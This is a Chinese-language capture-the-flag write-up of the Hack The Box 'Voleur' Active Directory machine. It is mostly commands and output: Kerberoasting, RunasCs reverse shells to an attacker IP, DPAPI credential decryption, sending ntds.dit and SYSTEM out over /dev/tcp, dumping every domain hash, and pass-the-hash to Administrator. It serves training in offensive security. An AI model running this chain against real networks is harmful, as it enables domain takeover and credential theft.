## Machine Information
As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt

## 扫描
```SHELL
$ nmap -sV -A 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 01:39 EDT
Nmap scan report for 10.10.11.76
Host is up (0.14s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-13 13:14:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 7h34m15s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-13T13:15:10
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   131.62 ms 10.10.16.1
2   182.74 ms 10.10.11.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.53 seconds

```

## 域信息收集
获取用户票据
```shell
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```

使用票据进行枚举
```shell
$ nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k

LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        voleur.htb      389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
$ nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

bloodhound收集
```shell
bloodhound-python -u ryan.naylor -p HollowOct31Nyt -k -ns 10.10.11.76 -c All -d voleur.htb --zip
```
![](attachments/Pasted%20image%2020250913144218.png)

smb 枚举

```SHELL
$ nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares --smb-timeout 500

SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark                                                              
SMB         dc.voleur.htb   445    dc               -----           -----------     ------                                                              
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin                                                        
SMB         dc.voleur.htb   445    dc               C$                              Default share                                                       
SMB         dc.voleur.htb   445    dc               Finance                 
SMB         dc.voleur.htb   445    dc               HR                      
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC                                                          
SMB         dc.voleur.htb   445    dc               IT              READ    
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share                                                  
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```

利用票据连接smb

```SHELL
KRB5CCNAME=ryan.naylor.ccache impacket-smbclient -k DC.VOLEUR.HTB
```

![](attachments/Pasted%20image%2020250913160714.png)

john破解
```SHELL
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx) 
```

![](attachments/Pasted%20image%2020250913161213.png)


拿到了两个用户

| svc_ldap |     | LDAP Services      | P/W - M1XyC9pW7qT5Vn |
| -------- | --- | ------------------ | -------------------- |
| svc_iis  |     | IIS Administration | P/W - N5pXyW1VqM7CZ8 |
|          |     |                    |                      |
![](attachments/Pasted%20image%2020250913161544.png)

获取票据
```shell
impacket-getTGT voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'  
```

```SHELL
 KRB5CCNAME=/home/kali/Desktop/htb/Voleur/svc_ldap.ccache python targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$7047b4d0da352ae9ffb72e77cec4a889$7cc7ba975457d4d3400ffeb7738f785c0021c2e67780e5ef165ee8c18ad6a0a7a839e0dd436257758a11328a9921f6116569c5b9e6181b5cd24c549a0aa502e46ec04a3b13ddd61f052b1a249781b3bd48bdda2d5e4f3057c3732e30552aad17b12f9655cad295a91b480d378cca18f86fa9ddf357140ccff5cf57d06cb6f5346465963f3aae5b4e197871c2898282d88848e1740da9dbfb461351d29c5296f4acdbe017e950ac6e8f8d44ea55d3a671bc8a2f0491e8f94d96f8ac27398c99df7f718ba3ff4716c061463640ef2b77fe07d48cfb0a3071ec3aa690e8df1dfe4c19166210be6c71c2064735997dd74c3fc443543012c292bcb7012091d4cfb901faf1eac3b31fe80b7daced12fb5e96817edd57f25c8155d24909c2da5e5c7df64bcf058fa6b61c8b195265173480a979d088aeb5d2208c5ae3ce96288ba0174f703a95141bfc1ae7dac2ec4dcb9e2ca562b895c0caed661673d57e7f7d90da90cd460a3a0e6e9afcf49f6080e3099426368e90f1c851503b4f89cbf8ccf3506a3b746d62cf286b41126df9db68dc5d9283c0805a826d63c4211198204b788ebb8cc2258c0b95d6feaadef2277b3d54a43f271d07f267e6ce6b33bf6ee9d7d901f2fc5b8eff90d6d5cdcf7f02a45dd1c46b292fd9fba6b6dff6ab1012bb19df21d2b238a804cbe3d53aec66a74b40620ee2270cce8a41b2874d9b96822fd316827d5bb1adaca187a45ae6c3a6bec747bee9e955db1f152cdcab8a8ed12f0e2d2a04a36fbbaed3644298c667c56e950f6154b5301a26bf0225b763ce8683ef66b02caaafcf0d0806cbba07b6dd9f6bb0ff69efb3fecf1ac100e27681f7a85564cffdfa0d9cef24d2d2043ad58fd715ed99a591f7f5c06f78e13dcf575f074391683d796c7b4f141e53637ffe5e21511b9c5dd6f7eeb638d820b700a7368bdfa61d97be73521ba0e5350ed93b65b47e49104d6cadd6feb6a3151bd56b3bda202cb87b634bae85a54a7f8893f12dd534c76ccac20225c1680cff16d6d318ca3252bbf5318adc7631379cf14a94e4ae44d71142ae14450fc843159aa750ca939c2f833fe0928f51576127f3732d9bcfdc728e5923f46376092b9d12608cbf4023719f4bba9d3ee98fafa81ccdc3bf28e569aab902052d60d437f06b0321c40e68d70547abd3f8ca6d6a138ff6594802d85d2cfad3076e049ad4ec92fb5b65a6ef35cd00c52794d054f3e3d710e3414f340c0611336cdd28fff3540b9211b081bcc803214f6e32c80728442cc57e5a7c9fd8e963978a5ccc66699211d7f814eb97da69d305870d424eb9c59f86d5a3db6d32390b689212405d1aa6f9eb057aaa948f665f1c1032766ad6db278bc758570fe3879a062332259e59a6d9039df8cbc67fce837d0f908ffb9321319e212a217a9573d9d7de15cc18fa9dae031c9857e7d1c7c7c8fe614d507146a043cfca635c001486b673
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$da4eabbcb12fe92b3740d33bf8d9b56b$4e512eddbefd4d23772edcd93f6facbcd53848bb2c26d66ebd744f6d1ca63633c4b1be674dc14358c60ff1ce57d586f79e8309e07b1df596474aebc4373823122703ecc399b61daa3eba12a66e6869a0263142aefc20785e25a31675a413a9c37e95a98066910eb2dedd25483c99f60492f955e5b37d22303265a2e29b4a48c8eb79e93afb904a25000ae3de7807b65671509c28f0fd032d5908abf8120b4199ad1cdfd448646ca41ac077328107a8abeb2905922b3e775b0459976b875dd7333d8a3de21969c3aa3237c21055123e6e4e193607ccf87ebea201fe70e0eaa71497d5da9512d527719f85de9ae72aa64cafd6cc0508ad21b26bdb35d43b85e5b78f99536238974f6c0d2b4c543410c27fb51d3e5c899be3bbd97f97af6c46ce5dc41eb824500b2e22213276d08d3cbc0ab6b5270b1800a0b604cf5a6756fac05367bb9778955530e6f9c28315d068ad713893f7e9c69aa91ac37b58600fe02d9402acf640bc796392ede640b200b3ce4117ea3a94eacfd7656b292ca87b0d5fbcd03cedb464cd97bb19546c62ec9f4a0cec6daea4d19abe2ea9d29760a5d5fe8dc792e46ebc2f35bb6814d97135e4906442e0c991f4ebc0fc50f2eed9b2ff5ed7c78e7d856f145df7a4e3490a7f2160253f86b3f7b022531f6241659f6139341dc384d7198be02b88df40c10ffb9efa0825abaa9ffa6301698b4ad152fe778ce28be48cc9ef7d25a0656b67513988cc80cdf8ad7053846326fa7e7ac1832bcf70670aaf76872af40f252cc2da34252ae9d5db46ae73a8deb0955d01324448ae3ce32b47dd10a1649ddc5fe96e6778ac2f9926feca05bd91478039eccee80ad9cba5f083ca7ce65b742d07c14ea2e54da45a7652e0aec245934d20d4218ee1c6cce6f0498d9714f8505a96096d9bca9cd85a0e4d8c7b807b4a0f8b1aa9a13b9fba512a3b279369c3e683ef2d891e12d4e3bfe216563264a0ab7c47576702fc4317ef3a5655af57df05851fb989afe2ff5b79b77231f303475cc12becaaac68f6995caf7432e285fd04107e1ca452ecaed14abec6f377b3a3b1629681985c9022d5da09618adb6487f5ea0dc901622451507b9adad2dc3218476350ba0290e536739d3d729a7cc27e4974b967e2bfefb4c842b0ffcd3052c5301160adfe535fa317769f8978c9eb42fabf31ed258d4eeb3397bbb5a4048cc7357cf9ac48fbac042869ab54b88ea39e15db4ead72586ec393fcffd7ad874f267ee713a6cd3acc6a802c22b7a111e33e3d032dbd37020c085b9e2ebf42a78d745b8878b0dc26a2e3b400f0a389c661c8be114609ded3469a92971feb0c4c3a46d131d6a4b31a28ca8c24900b163d55b329b8e658f2814a6c9257cc34c6a618e96e8ec0e5fb463a6270917e2fe41b44c1e0e1f64e8c81aac75f2d626cd4305db2a1fb4be3cea187eb21b1a110717fa6dd9af6c2d74d88ec0d9a8c378c
```

破解svc_winrm密码
```SHELL
$ john svc_winrm_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:15 DONE (2025-09-13 13:09) 0.06345g/s 727910p/s 727910c/s 727910C/s AHANACK6978012..AFITA4162
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

拿svc_winrm的票据

```SHELL
impacket-getTGT voleur.htb/'svc_winrm':'AFireInsidedeOzarctica980219afi'
```
登陆

```SHELL
KRB5CCNAME=/home/kali/Desktop/htb/Voleur/svc_winrm.ccache  evil-winrm -i dc.voleur.htb -r VOLEUR.HTB 
```

上传RunasCs准备切换svc_ldap的用户
```SHELL
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> upload ../../tools/RunasCs/RunasCs.exe
                                        
Info: Uploading /home/kali/Desktop/htb/Voleur/../../tools/RunasCs/RunasCs.exe to C:\Users\svc_winrm\Desktop\RunasCs.exe                                 
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!

```

```SHELL
.\RunasCS.exe svc_ldap M1XyC9pW7qT5Vn  powershell.exe -r 10.10.16.64:23456
```

尝试去找回todd这个被删除的具有远程权限的用户

```POWERSHELL
PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjectsGet-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db


PS C:\Windows\system32> Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
PS C:\Windows\system32> net user /domain
net user /domain

User accounts for \\DC

-------------------------------------------------------------------------------
Administrator            krbtgt                   svc_ldap                 
todd.wolfe               
The command completed successfully.
```

![](attachments/Pasted%20image%2020250913185540.png)


继续弹shell(Tood.Wolfe)
```SHELL
.\RunasCs.exe Todd.Wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.16.64:10002
```

到IT下翻找

![](attachments/Pasted%20image%2020250913192943.png)

获取DPAPI密钥与数据
```
[convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"))
[convert]::ToBase64String([IO.File]::ReadAllBytes("C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"))
```

破解DPAPI
```SHELL
# 破解密钥
$ impacket-dpapi masterkey -file protect_raw.txt -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
# 破解用户凭证
$ impacket-dpapi credential -file credentia_raw.txt -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

获取票据
```shell
impacket-getTGT voleur.htb/'jeremy.combs':'qT3V9pLXyN7W4m' 
```
再次收集域信息
```SHELL
$ KRB5CCNAME=/home/kali/Desktop/htb/Voleur/jeremy.combs.ccache bloodhound-python -u jeremy.combs -p qT3V9pLXyN7W4m -k -ns 10.10.11.76 -c All -d voleur.htb --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
INFO: Done in 00M 19S
INFO: Compressing output into 20250913154738_bloodhound.zip
```

![](attachments/Pasted%20image%2020250913201432.png)

```SHELL
KRB5CCNAME=/home/kali/Desktop/htb/Voleur/jeremy.combs.ccache impacket-smbclient -k dc.voleur.htb
```

![](attachments/Pasted%20image%2020250913202206.png)

Note.txt.txt
```TXT
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```
用id_rsa登陆
```SHELL
ssh -i id_rsa svc_backup@voleur.htb -p 2222
```

WSL与主机的文件是通过/mnt挂载

![](attachments/Pasted%20image%2020250913202704.png)

将文件传出来
```
cat SYSTEM> /dev/tcp/10.10.16.64/8888
nc -lvnp 8888 > SYSTEM
cat ntds.dit > /dev/tcp/10.10.16.64/8888
nc -lvnp 8888 > ntds.dit

```

本地破解哈希

```SHELL
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 
```

获取票据
```SHELL
impacket-getTGT -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 'voleur.HTB/administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

```
登陆
```SHELL
KRB5CCNAME=administrator.ccache evil-winrm -i dc.voleur.htb -r voleur.htb
```

![](attachments/Pasted%20image%2020250913204136.png)